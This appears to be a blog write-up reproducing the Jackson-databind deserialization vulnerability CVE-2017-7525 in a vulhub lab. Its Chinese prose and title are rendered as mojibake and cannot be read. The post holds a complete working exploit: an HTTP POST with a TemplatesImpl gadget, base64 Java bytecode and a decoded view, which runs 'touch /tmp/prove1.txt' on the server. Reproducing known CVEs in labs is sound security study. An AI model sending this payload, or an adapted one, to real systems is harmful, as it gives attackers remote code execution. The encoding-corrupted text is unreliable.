---
layout:     post
title:      ã€æ¼æ´å¤ç°ã€‘Jackson-databind ååºåˆ—åŒ–æ¼æ´å¤ç°åŠåˆ†æï¼ˆCVE-2017-7525ï¼‰
subtitle:   ååºåˆ—åŒ–æ¼æ´
date:       2020-10-16
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - æ¼æ´å¤ç° 
---

## 0x00 Jackson-databind
Jacksonæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–jsonçš„Javaå¼€æºæ¡†æ¶ã€‚

Jackson-databind æ”¯æŒ Polymorphic Deserialization ç‰¹æ€§ï¼ˆé»˜è®¤æƒ…å†µä¸‹ä¸å¼€å¯ï¼‰ï¼Œå½“ json å­—ç¬¦ä¸²è½¬æ¢çš„ Target class ä¸­æœ‰ polymorph fieldsï¼Œå³å­—æ®µç±»å‹ä¸ºæ¥å£ã€æŠ½è±¡ç±»æˆ– Object ç±»å‹æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ json å­—ç¬¦ä¸²ä¸­æŒ‡å®šå˜é‡çš„å…·ä½“ç±»å‹ (å­ç±»æˆ–æ¥å£å®ç°ç±»)ï¼Œæ¥å®ç°å®ä¾‹åŒ–æŒ‡å®šçš„ç±»ï¼Œå€ŸåŠ©æŸäº›ç‰¹æ®Šçš„ classï¼Œå¦‚ TemplatesImplï¼Œå¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚

Jackson-databind åœ¨è®¾ç½® Target class æˆå‘˜å˜é‡å‚æ•°å€¼æ—¶ï¼Œè‹¥æ²¡æœ‰å¯¹åº”çš„ getter æ–¹æ³•ï¼Œåˆ™ä¼šä½¿ç”¨ SetterlessProperty è°ƒç”¨ getter æ–¹æ³•ï¼Œè·å–å˜é‡ï¼Œç„¶åè®¾ç½®å˜é‡å€¼ã€‚å½“è°ƒç”¨ getOutputProperties() æ–¹æ³•æ—¶ï¼Œä¼šåˆå§‹åŒ– transletBytecodes åŒ…å«å­—èŠ‚ç çš„ç±»ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ
## 0x01 æ¼æ´ç¯å¢ƒ
vulhub/jackson/CVE-2017-7525
## 0x02 æ¼æ´å¤ç°
è®¿é—®192.168.111.130:8080
![-c881](/img/16027831337161.jpg)
ä½¿ç”¨com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplä½œä¸ºGadgetï¼Œå‘é€å¦‚ä¸‹è¯·æ±‚ï¼Œå°†ä¼šæ‰§è¡Œtouch /tmp/prove1.txtï¼š
```
POST /exploit HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 1298

{
  "param": [
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {
      "transletBytecodes": [
  "yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw=="
      ],
      "transletName": "a.b",
      "outputProperties": {}
    }
  ]
```

transletBytecodes:
```
3(
	paramLjava/lang/Object;<init>()VCodeLineNumberTableLocalVariableTablethisLcom/b1ngz/sec/model/Target;getParam()Ljava/lang/Object;setParam(Ljava/lang/Object;)V
SourceFileTarget.javacom/b1ngz/sec/model/Targetjava/lang/Object<clinit>java/lang/Runtime
getRuntime()Ljava/lang/Runtime;
touch /tmp/prove1.txt exec'(Ljava/lang/String;)Ljava/lang/Process;!"
#@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet%
&!&	/*'
	/*
```
å‘é€POSTæ•°æ®åŒ…ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤åˆ›å»ºprovel.txtæ–‡ä»¶ã€‚

![-c697](/img/16027831513705.jpg)

